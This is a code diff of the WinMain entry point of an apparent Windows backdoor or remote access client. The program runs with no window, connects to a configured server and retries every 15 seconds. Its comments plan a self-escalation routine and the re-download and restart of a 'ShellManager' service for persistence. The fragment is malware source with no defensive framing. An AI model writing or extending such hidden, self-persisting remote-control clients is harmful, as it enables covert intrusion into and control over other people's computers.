@@ -1,19 +1,15 @@
 #include "general.h"
 
-//WinMain is the entry point for windows subsystem (GUI apps) but without initializing the window the process will be hidden graphically
-int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
-    _In_opt_ HINSTANCE hPrevInstance,
-    _In_ LPWSTR    lpCmdLine,
-    _In_ int       nCmdShow)
+int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int nCmdShow)	//main function
 {
-    UNREFERENCED_PARAMETER(hPrevInstance);
-    UNREFERENCED_PARAMETER(lpCmdLine);
+	//Should add a self escalation routine
 
 	Client MyClient(Settings::serverIP, Settings::serverPort); //Client
 
 	while (true)
 	{
-		//Here should check if service is still running/exists, if it doesn't then create it again by downloading it from the web I guess
+
+		//Here maybe check if the ShellManager service is still active, and if it isn't download it if necessary and start it up again
 
 		if (!MyClient.connected)
 		{
@@ -24,6 +20,6 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
 		}
 		Sleep(15000);
 	}
-	
-    return 0;
+
+	return 0;
 }
